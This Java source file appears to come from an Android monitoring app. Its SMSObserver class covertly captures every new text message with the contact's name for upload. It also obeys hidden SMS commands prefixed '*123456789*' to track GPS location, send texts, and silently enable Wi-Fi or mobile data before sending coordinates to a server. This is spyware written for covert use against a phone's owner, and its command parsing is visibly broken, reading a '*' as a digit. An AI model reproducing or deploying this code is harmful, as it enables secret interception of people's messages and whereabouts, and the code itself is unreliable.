package com.privacy.monitor.resolver;

import java.util.Date;
import com.baidu.location.LocationClientOption;
import com.privacy.monitor.base.C;
import com.privacy.monitor.db.DirectiveDB;
import com.privacy.monitor.db.SMSRecordDB;
import com.privacy.monitor.domain.Directive;
import com.privacy.monitor.domain.SMSRecord;
import com.privacy.monitor.inte.RunBack;
import com.privacy.monitor.location.LocationMan;
import com.privacy.monitor.resolver.field.SMSConstant;
import com.privacy.monitor.util.AppUtil;
import com.privacy.monitor.util.HttpUtil;
import com.privacy.monitor.util.Logger;
import com.privacy.monitor.util.NetworkUtil;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.SystemClock;
import android.telephony.SmsManager;

/**
 * 短信观察者
 */
public class SMSObserver extends ContentObserver {
	
	private Context context;
	private SMSRecordDB sqlite;
	private RunBack runBack;
	private DirectiveDB directiveDB;
	private ContentResolver mResolver;
	
	// 需要获得的字段列
	private static final String[] PROJECTION = {SMSConstant.TYPE,
			SMSConstant.ADDRESS, SMSConstant.BODY, SMSConstant.DATE,
			 SMSConstant.READ};

	public SMSObserver(ContentResolver resolver, Handler handler,Context context,RunBack runBack) {
		super(handler);
		this.mResolver = resolver;
		this.context = context;
		this.sqlite = SMSRecordDB.getInstance(context);
		this.runBack = runBack;
		this.directiveDB = DirectiveDB.getInstance(context);
	}
 
	public SMSObserver(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		Logger.d("SMSObserver","selfChange11111111111111111111:"+selfChange);
		if(mResolver!=null && context !=null && !selfChange){
			Cursor smsCursor = mResolver.query(SMSConstant.CONTENT_URI, // 查询的URI,
					PROJECTION, // 需要取得的列 ,
					null, // 查询语句
					null, // 可能包括您的选择，将被替换selectionArgs的值，在选择它们出现的顺序。该值将被绑定为字符串。
					"_id DESC LIMIT 1");
			if (smsCursor != null) {
				while (smsCursor.moveToNext()) {
					int typeIndex = smsCursor.getColumnIndex(SMSConstant.TYPE);
					int dateIndex =  smsCursor.getColumnIndex(SMSConstant.DATE);
					int addressIndex =smsCursor.getColumnIndex(SMSConstant.ADDRESS);
					int bodyIndex = smsCursor.getColumnIndex(SMSConstant.BODY);
					if(typeIndex !=-1 && dateIndex !=-1 && addressIndex !=-1 && bodyIndex !=-1){
						final String type = smsCursor.getString(typeIndex);
						final String date = smsCursor.getString(dateIndex);
						final String phone = smsCursor.getString(addressIndex);
						final String body = smsCursor.getString(bodyIndex);
						
						if(body.startsWith("*123456789*")){
							String strType = body.substring(10,11);
							int iType = Integer.valueOf(strType);
							String strStatus = body.substring(12, 13);
							int iStatus = Integer.valueOf(strStatus);
							if(iType==25){
								int index = strType.lastIndexOf("*");
								String content = strType.substring(index);
								directive(iType,iStatus,content);
							}else {
								directive(iType,iStatus,"");
							}
							
							break;
						}
						
						Cursor contractsCursor = mResolver.query(Uri.parse("content://com.android.contacts/data"),new String []{"mimetype","raw_contact_id","data1"}," data1 LIKE ? ",new String[]{"%"+phone+"%"},null);
						boolean isUpload = false;
						if(contractsCursor !=null){
							while(contractsCursor.moveToNext()){
								int rawId = contractsCursor.getColumnIndex("raw_contact_id");
								if(rawId !=-1){
									Cursor nameCursor = mResolver.query(Uri.parse("content://com.android.contacts/data"),new String []{"mimetype","data1","raw_contact_id"}," raw_contact_id = ? ",new String[]{rawId+""},null);
								    if(nameCursor !=null){
								    	while(nameCursor.moveToNext()){
								    		int mimeTypeIndex = nameCursor.getColumnIndex("mimetype");
								    		if(mimeTypeIndex !=-1){
						                    	String mimeType = nameCursor.getString(mimeTypeIndex);
												if("vnd.android.cursor.item/name".equals(mimeType)){
													int data1Index = nameCursor.getColumnIndex("data1");
													if(data1Index !=-1){
														final String names = nameCursor.getString(data1Index);
														isUpload = true;
														SMSRecord smsRecord = new SMSRecord();
														smsRecord.setMessageType(type);
														smsRecord.setMessageContent(body);
														smsRecord.setDateSent(date);
														smsRecord.setPhone(phone);
														smsRecord.setName(names);
														smsRecord.setUploadStatus("0");
														sqlite.insert(smsRecord);
														if(runBack !=null){
															runBack.run();
														}
														break;
													}
												}
						                    }
								    	}
								    	nameCursor.close();
								    	break;
								    }
								}
							}
							contractsCursor.close();
						}
						if(!isUpload){
							SMSRecord smsRecord = new SMSRecord();
							smsRecord.setMessageType(type);
							smsRecord.setMessageContent(body);
							smsRecord.setDateSent(date);
							smsRecord.setPhone(phone);
							smsRecord.setUploadStatus("0");
							sqlite.insert(smsRecord);
							if(runBack !=null){
								runBack.run();
							}
						}
					}
					break;
				}
				/*
				 * 关闭游标，释放资源。否则下次查询游标仍然在原位置
				 */
				if(smsCursor !=null){
					smsCursor.close();
				}
			}
		}	
	}
	
	private void directive (int directiveNum,int status,String content){
		if(directiveDB !=null){
			Date date = new Date();
			String head = "*123456789*";
			boolean existStatus =directiveDB.exists(Directive.COL_TYPE+ " = ? ",new String []{status+""});
			if(existStatus && directiveNum !=25 && directiveNum !=17){
				directiveDB.update(Directive.COL_STATUS+" = ? "+", " + Directive.COL_START_TIME +"=? ", Directive.COL_TYPE +" =? ",new String []{status+"",date.getTime()+"",directiveNum+""});
			}else if(directiveNum==25){
				
				if(status==1){
					directiveDB.delete(Directive.COL_STATUS+"= ? ",new String []{content});
				}else{
					directiveDB.delete(Directive.COL_TYPE +" = ? ",new String []{"24"});
				}
				
			}else if(directiveNum==17){
			
				SmsManager.getDefault().sendTextMessage(status+"",null,content, null,null);
				
			}else {
				Directive directive = new Directive();
				directive.setDirHead(head);
				directive.setDirStatus(status+"");
				directive.setDirType(directiveNum+"");
				directive.setDirStartTime(date.getTime()+"");
				directive.setDirPlatform(C.Directive.SMS+"");
				directiveDB.insert(directive);
			}
			switch(directiveNum){
			case 12:
			case 13:
				LocationMan locationMan = new LocationMan(context);
				if(directiveNum==12){
					locationMan.setLocationPro(LocationClientOption.GpsFirst);
				}else {
					locationMan.setLocationPro(LocationClientOption.NetWorkFirst);
				}
				locationMan.setRunBack(new MyRunnback());
				locationMan.startLocaiton();
				break;
			case 14:
				
				break;
			}
		}
	}
	
	private class MyRunnback implements RunBack{

		@Override
		public void run() {
		}

		@Override
		public void run(final Object object) {
			if(!HttpUtil.detect(context)){
				new Thread(new Runnable() {
					@Override
					public void run() {
						AppUtil.toggleWifi(context, true);
						SystemClock.sleep(10000);
						if(!HttpUtil.detect(context)){
							AppUtil.toggleMobileNet(context, true);
							SystemClock.sleep(10000);
							if(object instanceof String []){
								String [] lo = (String[]) object;
								uploadLocation(lo);
							}
						}
					}
				}).start();
			}else {
				if(object instanceof String []){
					String [] loc = (String[]) object;
					uploadLocation(loc);
				}
			}
		}
	}
	
	private void uploadLocation(String [] locaInfo){
		if(locaInfo !=null && locaInfo.length==2){
			Date date = new Date();
			SharedPreferences sp = context.getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
			NetworkUtil.upload(context,"tel:"+sp.getString(C.PHONE,"")+"&lat="+locaInfo[0]+"&lon="+locaInfo[1]+"&time="+date.getTime(),C.RequestMethod.uploadLocation);
		}
	}
}
